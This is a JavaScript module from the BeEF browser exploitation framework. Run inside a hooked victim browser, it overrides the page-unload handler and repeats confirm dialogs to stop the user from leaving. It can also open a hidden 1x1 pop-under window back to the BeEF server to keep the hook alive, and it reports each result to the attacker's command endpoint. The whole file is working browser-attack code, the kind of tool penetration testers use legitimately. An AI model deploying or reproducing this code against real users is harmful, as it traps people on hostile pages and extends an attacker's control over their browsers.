//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

    function display_confirm(){
        if(confirm("<%= @text %>")){
            display_confirm();
        }
    }

    function dontleave(e){
        e = e || window.event;

        var usePopUnder = '<%= @usePopUnder %>';
        if(usePopUnder) {
            var popunder_url = beef.net.httpproto + '://' + beef.net.host + ':' + beef.net.port + '/demos/plain.html';
            var popunder_name = Math.random().toString(36).substring(2,10);
            beef.debug("[Create Pop-Under] Creating window '" + popunder_name + "' for '" + popunder_url + "'");
            beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Pop-under window requested');
            try {
                window.open(popunder_url,popunder_name,'toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=0,width=1,height=1,left='+screen.width+',top='+screen.height+'').blur();
                window.focus();
                beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Pop-under window successfully created!', beef.are.status_success());
            } catch(e) {
                beef.debug("[Create Pop-Under] Could not create pop-under window");
                beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Pop-under window was not created', beef.are.status_error());
            }
        }

        if(beef.browser.isIE()){
            e.cancelBubble = true;
            e.returnValue = "<%= @text %>";
        }else{
            if (e.stopPropagation) {
                e.stopPropagation();
                e.preventDefault();
                e.returnValue = "<%= @text %>";
            }
        }

        //re-display the confirm dialog if the user clicks OK (to leave the page)
        display_confirm();
        return "<%= @text %>";
    }

    window.onbeforeunload = dontleave;

	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'Module executed successfully');
});
